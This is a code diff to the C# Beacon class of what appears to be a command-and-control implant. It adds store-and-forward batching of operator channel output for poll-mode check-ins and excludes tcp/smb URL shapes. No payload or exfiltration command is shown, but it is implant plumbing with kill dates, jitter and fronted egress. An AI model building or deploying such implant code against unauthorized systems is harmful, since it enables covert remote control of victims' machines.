@@ -94,6 +94,12 @@ internal sealed class Beacon : ICheckInClient
         : this(egress, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll, classVerbs, log, nonces, cadence, held)
     {
         _mode = mode;
+        // The poll run's store-and-forward channel carriage: channels batch
+        // their output and final results into the upstream this object owns,
+        // flushed at each cycle's start, input arriving on later cycles --
+        // the same discipline every poll-mode client runs (PollChannels).
+        if (mode == BeaconModes.Poll)
+            _poll = new PollChannels(_held, log);
     }
 
     /// <summary>
@@ -142,19 +148,25 @@ internal sealed class Beacon : ICheckInClient
         _tasking = new BeaconTasking(_implantId, _cas, _fronted, _nonces, _held, _handlers, _log);
     }
 
+    // The poll run's channel carriage; null on a stream run, whose channels
+    // live on the connection itself.
+    private readonly PollChannels? _poll;
+
     /// <summary>
     /// This client carries the bare host:port URL shape (architecture.md
     /// Sec 8): the mTLS socket the gRPC stream dials. A schemed beacon URL
     /// belongs to another client -- http(s) to the envelope POST cycle or the
-    /// WebSocket beacon, quic to the QUIC stream, dns/doh to the DNS carrier
-    /// -- so the predicate excludes every schemed shape rather than relying
-    /// on the coordinator's ordering (the same disjointness the build-side
-    /// module registry gives its bare-authority fallthrough).
+    /// WebSocket beacon, quic to the QUIC stream, dns/doh to the DNS carrier,
+    /// tcp/smb to the socket check-in -- so the predicate excludes every
+    /// schemed shape rather than relying on the coordinator's ordering (the
+    /// same disjointness the build-side module registry gives its
+    /// bare-authority fallthrough).
     /// </summary>
     public bool Serves(string beaconUrl)
         => !BeaconUrl.IsWeb(beaconUrl)
            && !BeaconUrl.IsQuic(beaconUrl)
-           && !BeaconUrl.IsDns(beaconUrl);
+           && !BeaconUrl.IsDns(beaconUrl)
+           && !BeaconUrl.IsSocket(beaconUrl);
 
     /// <summary>
     /// Blocks until cancellation or the kill date passing. Reconnects after a
@@ -168,6 +180,23 @@ internal sealed class Beacon : ICheckInClient
     /// is a web URL, so the coordinator hands the run to the envelope client.
     /// </summary>
     public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
+    {
+        try
+        {
+            return await RunCyclesAsync(cancellationToken);
+        }
+        finally
+        {
+            // The run is ending: the poll carriage's channels end with it --
+            // the token releases the handlers, and the delivery waits keep
+            // the last upstream writes accounted before the coordinator
+            // moves on.
+            if (_poll is not null)
+                await _poll.DisposeAsync();
+        }
+    }
+
+    private async Task<CheckInExit> RunCyclesAsync(CancellationToken cancellationToken)
     {
         var consecutiveFailures = 0;
         while (!cancellationToken.IsCancellationRequested)
@@ -279,6 +308,11 @@ internal sealed class Beacon : ICheckInClient
         // intersected with the compiled handlers (architecture.md Sec 5.3),
         // and both negotiation arms ride it (Sec 9, Sec 10.3).
         var handshake = BeaconFrames.Handshake(_implantId, _handlers.AdvertisedVerbs(_classVerbs));
+        // The poll run's channel carriage rides the advertisement: the
+        // server's parking hub reads it off the session and parks operator
+        // input for the cycles to carry.
+        if (_poll is not null)
+            handshake.Capabilities.Add(PollChannels.Capability);
         await call.RequestStream.WriteAsync(new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) });
 
         if (!await call.ResponseStream.MoveNext(cancellationToken))
@@ -321,8 +355,23 @@ internal sealed class Beacon : ICheckInClient
         using var channelsGone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
         async Task Write(Frame frame, CancellationToken ct) => await WriteFrameAsync(call, writeGate, frame, ct);
 
+        // The poll run's store-and-forward batch rides first: every frame the
+        // channels queued while disconnected (output, final results) crosses
+        // on this cycle, delivered only when the writes did. Ahead of the
+        // held replay on purpose -- the batch carries a channel's output
+        // frames ahead of its final TaskResult, and a replayed result
+        // landing first would complete the task before the transcript
+        // frames that belong ahead of it.
+        List<Frame>? pollPending = null;
+        if (_poll is not null)
+        {
+            pollPending = _poll.SnapshotPending();
+            foreach (var frame in pollPending)
+                await Write(frame, cancellationToken);
+        }
+
         // Results whose delivery died with an earlier stream ride this one
-        // first (architecture.md Sec 10.3 -- the dispatch strand): the server
+        // next (architecture.md Sec 10.3 -- the dispatch strand); the server
         // records first-wins, so a re-send of a result the original stream
         // already landed is absorbed, and one it lost is recovered.
         await _tasking.ReplayUndeliveredAsync(Write, cancellationToken);
@@ -339,7 +388,10 @@ internal sealed class Beacon : ICheckInClient
                 // or a staged chunk run this implant demanded.
                 if (frame.Kind == FrameKind.ChannelInput)
                 {
-                    BeaconFrames.RouteChannelInput(frame, liveChannels, _log);
+                    if (_poll is not null)
+                        _poll.RouteInput(frame);
+                    else
+                        BeaconFrames.RouteChannelInput(frame, liveChannels, _log);
                     continue;
                 }
 
@@ -354,12 +406,19 @@ internal sealed class Beacon : ICheckInClient
 
                 await _tasking.AcceptAsync(
                     task,
-                    IsPoll,
                     Write,
                     (staged, ct) => RunStagedTaskAsync(call, writeGate, staged, ct),
-                    (started, handler) => StartChannel(call, writeGate, liveChannels, started, handler, channelsGone.Token),
+                    _poll is not null
+                        ? (started, handler) => _poll.StartChannel(started, handler)
+                        : (started, handler) => StartChannel(call, writeGate, liveChannels, started, handler, channelsGone.Token),
                     cancellationToken);
             }
+
+            // The batch crossed with the cycle's writes: clear exactly what
+            // was flushed. A cycle that died mid-write keeps its frames for
+            // the next one.
+            if (_poll is not null && pollPending is not null)
+                _poll.MarkDelivered(pollPending);
 
             // Poll mode: the queue is drained and the idle window closed the read
             // loop -- half-close the send side and wait for the server to end the
